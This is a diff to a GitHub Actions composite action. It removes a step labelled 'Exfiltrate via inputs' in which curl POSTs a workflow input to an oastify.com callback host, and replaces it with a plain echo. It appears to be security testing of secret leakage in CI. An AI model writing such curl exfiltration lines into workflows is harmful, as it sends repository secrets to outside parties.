@@ -11,7 +11,4 @@ runs:
     - name: Exfiltrate via inputs
       shell: bash
       run: |
-        echo "Attempting to exfil secrets via inputs..."
-        curl -X POST http://zeh4hwvxmschiptpzk4xjymwpnvej47t.oastify.com \
-          -d "tomas=${{ inputs.tomas }}"
-
+        echo "Test"
